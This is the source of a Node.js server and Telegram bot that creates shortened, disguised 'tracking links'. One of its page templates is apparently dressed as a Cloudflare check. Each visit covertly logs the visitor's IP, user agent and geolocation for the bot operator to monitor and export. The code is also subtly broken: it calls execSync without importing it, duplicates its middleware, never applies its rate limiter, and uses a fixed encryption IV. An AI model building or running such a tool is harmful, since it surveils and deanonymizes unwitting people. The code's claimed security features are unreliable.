const fs = require('fs');
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const app = express();

// Replace bot initialization with this secure version
const bot = new TelegramBot(process.env.BOT_TOKEN);
bot.setWebHook(`${process.env.HOST_URL}/telegram-webhook`, {
  max_connections: 5, // Comply with Telegram limits
  allowed_updates: ['message', 'chat_member']
});

// Add at the top of your Express configuration
app.set('trust proxy', true); // Enable reverse proxy support

// Configuration
const CONFIG = {
  hostURL: process.env.HOST_URL,
  maxFileSize: 20 * 1024 * 1024,
  allowedMedia: ['image', 'audio', 'video', 'document'],
  encryptionKey: process.env.ENCRYPTION_KEY,
  rateLimit: {
    windowMs: 15 * 60 * 1000,
    max: 100
  }
};

// Replace existing middleware with this
app.use((req, res, next) => {
  // Block suspicious requests
  if (req.path.includes('.env') || req.path.includes('wp-admin')) {
    return res.status(403).send('Forbidden');
  }
  
  req.clientInfo = {
    ip: req.headers['x-real-ip'] || req.ip,
    userAgent: req.headers['user-agent'],
    geo: geoip.lookup(req.ip)
  };
  
  next();
});

// Replace existing rate limiter with this enhanced version
const limiter = rateLimit({
  ...CONFIG.rateLimit,
  validate: { trustProxy: true }, // Explicitly trust proxies
  keyGenerator: (req) => {
    return req.headers['x-real-ip'] || req.ip; // Use Vercel's real IP header
  }
});

// Database simulation with encryption
const userDB = new Map();

const encrypt = (text) => {
  const cipher = crypto.createCipheriv('aes-256-cbc', 
    Buffer.from(CONFIG.encryptionKey), 
    Buffer.alloc(16, 0)
  );
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return encrypted.toString('hex');
};

const decrypt = (text) => {
  const decipher = crypto.createDecipheriv('aes-256-cbc',
    Buffer.from(CONFIG.encryptionKey),
    Buffer.alloc(16, 0)
  );
  let decrypted = decipher.update(Buffer.from(text, 'hex'));
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString();
};

// Advanced middleware
app.use((req, res, next) => {
  req.clientInfo = {
    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
    userAgent: req.headers['user-agent'],
    geo: geoip.lookup(req.ip)
  };
  next();
});

// Webhook handler
app.post('/telegram-webhook', (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// Add before other routes
app.get('/favicon.ico', (req, res) => res.status(204).end());
app.get('/favicon.png', (req, res) => res.status(204).end());

// Enhanced route handler
app.get('/:type(w|c)/:path/:uri', (req, res) => {
  try {
    const { type, path, uri } = req.params;
    const view = type === 'w' ? 'webview' : 'cloudflare';
    
    const userData = {
      ...req.clientInfo,
      decodedURL: decrypt(uri),
      timestamp: new Date().toISOString()
    };

    userDB.set(path, userData);
    res.render(view, { ...userData, uid: path, config: CONFIG });
  } catch (err) {
    errorHandler(err, req, res);
  }
});

// 10 Advanced Features:

// 1. Two-Factor Authentication
const tfaStore = new Map();
bot.onText(/\/enable2fa/, async (msg) => {
  const chatId = msg.chat.id;
  const secret = crypto.randomBytes(16).toString('hex');
  tfaStore.set(chatId, secret);
  await bot.sendMessage(chatId, `Your 2FA secret: ${secret}`);
});

// 2. Data Export
bot.onText(/\/export (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const uid = match[1];
  const data = userDB.get(uid);
  const json = JSON.stringify(data, null, 2);
  await bot.sendDocument(chatId, Buffer.from(json), {}, { filename: `${uid}_export.json` });
});

// 3. Virus Scanning
async function scanFile(buffer) {
  const tmpFile = `/tmp/${Date.now()}.tmp`;
  fs.writeFileSync(tmpFile, buffer);
  try {
    execSync(`clamscan ${tmpFile}`);
    return true;
  } catch {
    return false;
  } finally {
    fs.unlinkSync(tmpFile);
  }
}

// 4. Real-time Monitoring
const activeSessions = new Map();
bot.onText(/\/monitor (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const uid = match[1];
  activeSessions.set(uid, chatId);
  await bot.sendMessage(chatId, `Monitoring session: ${uid}`);
});

// 5. Geolocation Filtering
function checkAllowedCountry(ip) {
  const allowedCountries = process.env.ALLOWED_COUNTRIES?.split(',') || [];
  const geo = geoip.lookup(ip);
  return allowedCountries.includes(geo?.country);
}

// 6. Automated Backups
setInterval(() => {
  const backupData = Object.fromEntries(userDB);
  fs.writeFileSync('/tmp/backup.json', JSON.stringify(backupData));
}, 3600 * 1000);

// 7. IP Blacklisting
const blacklist = new Set();
app.use((req, res, next) => {
  if (blacklist.has(req.clientInfo.ip)) {
    return res.status(403).send('Access denied');
  }
  next();
});

// 8. Activity Analytics
function trackEvent(uid, eventType) {
  const user = userDB.get(uid);
  user.analytics = user.analytics || [];
  user.analytics.push({
    type: eventType,
    timestamp: new Date().toISOString()
  });
}

// 9. Custom Alerts
function triggerAlert(uid, message) {
  const user = userDB.get(uid);
  if (user && activeSessions.has(uid)) {
    bot.sendMessage(activeSessions.get(uid), `🚨 Alert: ${message}`);
  }
}

// 10. URL Shortener
async function createShortLink(longUrl) {
  const response = await fetch('https://1pt.co/add', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ long: longUrl })
  });
  const data = await response.json();
  return `https://1pt.co/${data.short}`;
}

// Enhanced Bot Commands
bot.onText(/\/create/, async (msg) => {
  const chatId = msg.chat.id;
  const uid = crypto.randomBytes(16).toString('hex');
  const encryptedUID = encrypt(uid);
  const trackingUrl = `${CONFIG.hostURL}/w/${uid}/${encryptedUID}`;
  const shortUrl = await createShortLink(trackingUrl);
  
  await bot.sendMessage(chatId, `🛠 Tracking link created:\n${shortUrl}`);
});

// Vercel Deployment Handler
module.exports = app;

// Error handling
function errorHandler(err, req, res) {
  console.error('Error:', err);
  bot.sendMessage(process.env.ADMIN_CHAT_ID, `⚠️ Error: ${err.message}`);
  res.status(500).send('Internal Server Error');
}

// Add retry logic for Telegram API calls
const sendTelegramMessage = async (chatId, text, retries = 3) => {
  try {
    await bot.sendMessage(chatId, text);
  } catch (error) {
    if (error.response?.statusCode === 429 && retries > 0) {
      const retryAfter = error.response.headers['retry-after'] || 1;
      await new Promise(res => setTimeout(res, retryAfter * 1000));
      return sendTelegramMessage(chatId, text, retries - 1);
    }
    throw error;
  }
};

// Add health check endpoint
app.get('/', (req, res) => {
  res.status(200).json({
    status: 'online',
    version: process.env.VERCEL_GIT_COMMIT_SHA,
    environment: process.env.NODE_ENV
  });
});


// Server initialization
if (require.main === module) {
  const port = process.env.PORT || 3000;
  app.listen(port, () => {
    console.log(`Server running on port ${port}`);
    bot.sendMessage(process.env.ADMIN_CHAT_ID, '🚀 Server started');
  });
  }
